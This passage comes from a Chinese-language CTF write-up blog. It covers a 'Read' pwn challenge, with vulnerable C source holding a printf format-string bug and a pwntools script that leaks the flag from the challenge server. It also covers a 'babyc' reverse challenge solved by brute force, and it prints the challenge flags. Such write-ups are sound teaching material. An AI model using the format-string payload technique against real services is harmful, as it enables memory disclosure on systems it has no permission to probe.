accessdenied&#123;00b_4r3_v3ry_us3ful_r1ght_54a4ce45&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="read"><a class="markdownIt-Anchor" href="#read"></a> <strong>Read</strong></h2>
<p>Description：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Read</span>, <span class="hljs-keyword">Read</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Read</span>.<br><span class="hljs-keyword">server</span>: nc <span class="hljs-number">34.71</span><span class="hljs-number">.207</span><span class="hljs-number">.70</span> <span class="hljs-number">5337</span><br></code></pre></td></tr></table></figure>
<p>代码和文件都给了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> flag[<span class="hljs-number">64</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    alarm(<span class="hljs-number">0x20</span>);<br>	FILE *f = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>	<span class="hljs-keyword">if</span> (f == <span class="hljs-literal">NULL</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Flag File is Missing. \n&quot;</span>);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>	&#125;<br>	fgets(flag, <span class="hljs-number">64</span>,f);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter your name&quot;</span>);<br>	read(<span class="hljs-number">0</span>, name, <span class="hljs-number">32</span>);<br>	<span class="hljs-built_in">printf</span>(name);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里有个格式化字符串漏洞。这里我们要来利用这个漏洞来泄露flag的值。由于flag的地址高位是0，所以我们选择放在后面输入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">r&quot;format_string_read&quot;</span>)<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>flag_add = elf.symbols[<span class="hljs-string">&quot;flag&quot;</span>]<br><br>r = remote(<span class="hljs-string">&quot;34.71.207.70&quot;</span>, <span class="hljs-number">5337</span>)<br><br><span class="hljs-comment"># 由于是64位系统，地址8字节对齐所以前面我们需要填充至8字节。</span><br><span class="hljs-comment"># 字符串起始实际上是第八个参数。但这里我们讲flag放在字符串的第二个位置，所以读取位置+1</span><br>r.sendline(<span class="hljs-string">b&quot;%9$spppp&quot;</span> + p64(flag_add))<br><br><span class="hljs-built_in">print</span>(r.recvline())<br><span class="hljs-built_in">print</span>(r.recvline())<br><br><span class="hljs-comment"># accessdenied&#123;f0rm4t_5tr1ng_r34d_0fa330d1&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1>
<p>这一类我只写了一部分，还有一些是我朋友写的。</p>
<h2 id="babyc"><a class="markdownIt-Anchor" href="#babyc"></a> <strong>babyc</strong></h2>
<p>Description：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">C <span class="hljs-keyword">the</span> world <span class="hljs-keyword">with</span> see.<br></code></pre></td></tr></table></figure>
<p>文件是源代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-type">char</span> flag[] = &#123;<span class="hljs-number">-111</span>, <span class="hljs-number">-47</span>, <span class="hljs-number">-47</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">-39</span>, <span class="hljs-number">-39</span>, <span class="hljs-number">49</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">97</span>, <span class="hljs-number">-127</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">49</span>, <span class="hljs-number">-55</span>, <span class="hljs-number">9</span>, <span class="hljs-number">27</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">59</span>, <span class="hljs-number">97</span>, <span class="hljs-number">49</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">121</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-69</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">-111</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">113</span>, <span class="hljs-number">-71</span>, <span class="hljs-number">97</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">-101</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">11</span>, <span class="hljs-number">91</span>, <span class="hljs-number">-69</span>, <span class="hljs-number">11</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">-87</span>&#125;;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">reverse</span><span class="hljs-params">(<span class="hljs-type">char</span> ch)</span> &#123;<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        x *= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>((ch &amp; (<span class="hljs-number">1</span> &lt;&lt; i))) &#123;<br>            x++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">char</span>)x;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">(<span class="hljs-type">char</span> str[])</span> &#123;<br>    <span class="hljs-type">int</span> xor = <span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++) &#123;<br>        str[i] = reverse(str[i]);<br>        str[i] = (<span class="hljs-type">char</span>)(xor ^ str[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <br>    <span class="hljs-type">char</span> str[MAXSIZE];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%100s&quot;</span>, str);<br><br>    getchar();<br>    encode(str);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(flag, str) == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Granted :(&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Denied :)&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>直接爆破。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> char_set[] = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span>;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">46</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">94</span>; j++) &#123;<br>            <span class="hljs-keyword">if</span> (flag[i] == (<span class="hljs-type">char</span>)(<span class="hljs-number">23</span> ^ reverse(char_set[j])))&#123; <br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, char_set[j]);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// accessdenied&#123;x0r_4nd_r3v3r53_ar3_fun_1dd8258e&#125;</span><br></code></pre></td></tr></table></figure>
<p>最后还是只拿到了33名，也还算不错了。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Crypto/">Crypto</a>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                    
                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
                    
                      <a class="hover-with-bg" href="/tags/MISC/">MISC</a>
                    
                      <a class="hover-with-bg" href="/tags/Reverse/">Reverse</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/08/08/corCTF-2022/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">corCTF 2022</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/06/12/HSCTF-9/">
                        <span class="hidden-mobile">HSCTF 9</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>





  

  
    <!-- KaTeX -->
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0/dist/katex.min.css" />
  











<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
